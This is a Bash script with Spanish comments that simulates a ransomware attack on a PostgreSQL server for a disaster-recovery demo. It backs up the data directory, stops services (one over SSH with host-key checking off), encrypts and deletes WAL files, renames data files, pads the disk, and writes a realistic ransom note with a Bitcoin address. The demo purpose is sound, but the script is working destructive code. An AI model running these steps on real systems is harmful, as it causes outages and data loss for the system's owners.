#!/bin/bash
# =============================================================================
# encrypt_postgres.sh — Simula un ataque de ransomware sobre PostgreSQL
#
# USO (como root en la VM de base de datos):
#   ./encrypt_postgres.sh
#
# QUÉ HACE:
#   1. Para el servicio del backend (para que la Observability Console
#      muestre el impacto inmediatamente)
#   2. Hace una copia de seguridad del directorio de datos de PostgreSQL
#   3. Para PostgreSQL
#   4. Cifra los ficheros WAL y renombra los ficheros de datos (simula
#      el cifrado del ransomware sin destruir los datos realmente)
#   5. Genera 5 ficheros de padding de 512 MB para simular el disco
#      llenándose (efecto visual en la Observability Console)
#   6. Deja un fichero README_RANSOM.txt como los ransomware reales
#
# ADAPTADO DEL SCRIPT ORIGINAL:
#   - Usuario cambiado de 'adminhpe' a 'root'
#   - Padding reducido a 5×512 MB (2.5 GB) para respetar el espacio libre
#   - Añadida parada del backend antes de atacar la BD (mejor narrativa)
#   - Ruta PGDATA ajustada a PostgreSQL 16 (/var/lib/postgresql/16/main)
#
# PREREQUISITOS:
#   - openssl instalado (apt install openssl)
#   - Al menos 5 GB libres en la partición de datos
#   - Ejecutar como root
#
# RECUPERACIÓN:
#   Con Zerto  → failover al site DR desde la Observability Console
#   Con backup → ejecutar restore_postgres.sh en esta misma máquina
# =============================================================================

set -euo pipefail

# ── Configuración ─────────────────────────────────────────────────────────────
PGDATA="/var/lib/postgresql/16/main"
BACKUP_DIR="$(dirname "$0")/backup"
SERVICE_PG="postgresql"
SERVICE_BACKEND="flight-booking-backend"
BACKEND_HOST="10.10.44.14"   # IP de la VM de backend — ajusta si es diferente

PADDING_COUNT=5
PADDING_SIZE_MB=512
ENCRYPT_KEY="ransom-demo-key-2026"   # clave de demo, no es una clave real

# ── Colores ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'; BLD='\033[1m'; RST='\033[0m'

# ── Comprobaciones previas ────────────────────────────────────────────────────
if [ "$(id -u)" -ne 0 ]; then
  echo -e "${RED}ERROR: Este script debe ejecutarse como root.${RST}"
  exit 1
fi

if [ ! -d "$PGDATA" ]; then
  echo -e "${RED}ERROR: No se encuentra PGDATA en $PGDATA${RST}"
  exit 1
fi

if [ -d "$BACKUP_DIR" ]; then
  echo -e "${RED}ERROR: Ya existe un backup en $BACKUP_DIR"
  echo -e "Ejecuta restore_postgres.sh antes de volver a simular el ataque.${RST}"
  exit 1
fi

# Comprueba espacio disponible (necesita al menos tamaño PGDATA + 2.5 GB para padding)
PGDATA_SIZE_MB=$(du -sm "$PGDATA" | awk '{print $1}')
FREE_MB=$(df -m "$PGDATA" | awk 'NR==2{print $4}')
NEEDED_MB=$((PGDATA_SIZE_MB + PADDING_COUNT * PADDING_SIZE_MB + 1024))
if [ "$FREE_MB" -lt "$NEEDED_MB" ]; then
  echo -e "${RED}ERROR: Espacio insuficiente."
  echo -e "  Necesario: ~${NEEDED_MB} MB  |  Disponible: ${FREE_MB} MB${RST}"
  exit 1
fi

# ─────────────────────────────────────────────────────────────────────────────
echo -e "\n${BLD}${RED}⚠  SIMULACIÓN DE RANSOMWARE — FLIGHT BOOKING DATABASE${RST}"
echo -e "${YEL}Este script simula un ataque para fines de demostración."
echo -e "Los datos quedan en el backup — usa restore_postgres.sh para recuperarlos.${RST}\n"
sleep 2

# ── [1/6] Para el backend ─────────────────────────────────────────────────────
echo -e "${BLD}[1/6]${RST} Parando el backend (flight-booking-backend)..."
ssh -o StrictHostKeyChecking=no root@"$BACKEND_HOST" \
  "systemctl stop $SERVICE_BACKEND" 2>/dev/null \
  && echo -e "      ${GRN}✔ Backend parado${RST}" \
  || echo -e "      ${YEL}⚠ No se pudo parar el backend (continúa de todas formas)${RST}"

# ── [2/6] Backup del directorio de datos ──────────────────────────────────────
echo -e "${BLD}[2/6]${RST} Haciendo backup de PGDATA (~${PGDATA_SIZE_MB} MB)..."
mkdir -p "$BACKUP_DIR"
cp -a "$PGDATA" "$BACKUP_DIR/main"
chown -R root:root "$BACKUP_DIR"
echo -e "      ${GRN}✔ Backup guardado en $BACKUP_DIR/main${RST}"

# ── [3/6] Para PostgreSQL ─────────────────────────────────────────────────────
echo -e "${BLD}[3/6]${RST} Parando PostgreSQL..."
systemctl stop "$SERVICE_PG"
echo -e "      ${GRN}✔ PostgreSQL parado${RST}"

# ── [4/6] Cifra WAL y renombra ficheros de datos ─────────────────────────────
echo -e "${BLD}[4/6]${RST} Cifrando WAL y datos..."

# Cifra los ficheros WAL (Write-Ahead Log) con AES-256
WAL_DIR="$PGDATA/pg_wal"
if [ -d "$WAL_DIR" ]; then
  WAL_COUNT=0
  while IFS= read -r -d '' wal_file; do
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
      -in "$wal_file" -out "${wal_file}.enc" \
      -k "$ENCRYPT_KEY" 2>/dev/null
    rm -f "$wal_file"
    WAL_COUNT=$((WAL_COUNT + 1))
  done < <(find "$WAL_DIR" -maxdepth 1 -type f -print0)
  echo -e "      ${GRN}✔ $WAL_COUNT ficheros WAL cifrados${RST}"
fi

# Renombra los ficheros de base de datos (simula cifrado sin destruir datos)
BASE_DIR="$PGDATA/base"
if [ -d "$BASE_DIR" ]; then
  RENAMED=0
  while IFS= read -r -d '' db_file; do
    mv "$db_file" "${db_file}.encrypted"
    RENAMED=$((RENAMED + 1))
  done < <(find "$BASE_DIR" -maxdepth 2 -type f -not -name "*.encrypted" -print0)
  echo -e "      ${GRN}✔ $RENAMED ficheros de datos renombrados${RST}"
fi

# ── [5/6] Padding para llenar el disco (efecto visual) ───────────────────────
echo -e "${BLD}[5/6]${RST} Generando $PADDING_COUNT ficheros de padding (${PADDING_SIZE_MB} MB c/u)..."
PADDING_DIR="$PGDATA/pg_tblspc"
mkdir -p "$PADDING_DIR"
for i in $(seq 1 $PADDING_COUNT); do
  printf "\r      Generando fichero %d/%d..." "$i" "$PADDING_COUNT"
  dd if=/dev/urandom \
     of="$PADDING_DIR/ransom_padding_${i}.enc" \
     bs=1M count="$PADDING_SIZE_MB" \
     status=none 2>/dev/null
done
echo -e "\n      ${GRN}✔ Padding generado ($((PADDING_COUNT * PADDING_SIZE_MB)) MB)${RST}"

# ── [6/6] Nota de rescate ─────────────────────────────────────────────────────
echo -e "${BLD}[6/6]${RST} Dejando nota de rescate..."
cat > "$PGDATA/README_RANSOM.txt" << 'RANSOM'
YOUR FILES HAVE BEEN ENCRYPTED

All your database files have been encrypted with military-grade AES-256 encryption.
To recover your data, you must pay 50 BTC to the following address:

  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

After payment, send proof to: ransom@darkweb.onion

WARNING: Do not attempt to restore from backup — we have deleted your backups.
WARNING: Do not contact law enforcement — we are watching.

You have 72 hours. After that, the key will be destroyed.

--- THIS IS A SECURITY DEMONSTRATION ---
--- Run restore_postgres.sh to recover ---
RANSOM
echo -e "      ${GRN}✔ README_RANSOM.txt creado${RST}"

# ── Resumen final ─────────────────────────────────────────────────────────────
echo ""
echo -e "${RED}${BLD}════════════════════════════════════════════════════════${RST}"
echo -e "${RED}${BLD}  ATAQUE SIMULADO COMPLETADO${RST}"
echo -e "${RED}${BLD}════════════════════════════════════════════════════════${RST}"
echo -e "  Base de datos  : ${RED}CIFRADA / INACCESIBLE${RST}"
echo -e "  Backend        : ${RED}PARADO${RST}"
echo -e "  Backup local   : ${GRN}$BACKUP_DIR/main${RST}"
echo -e ""
echo -e "  ${BLD}RECUPERACIÓN:${RST}"
echo -e "  → Con Zerto  : failover desde la Observability Console"
echo -e "  → Con backup : ./restore_postgres.sh"
echo -e "${RED}${BLD}════════════════════════════════════════════════════════${RST}"
echo ""
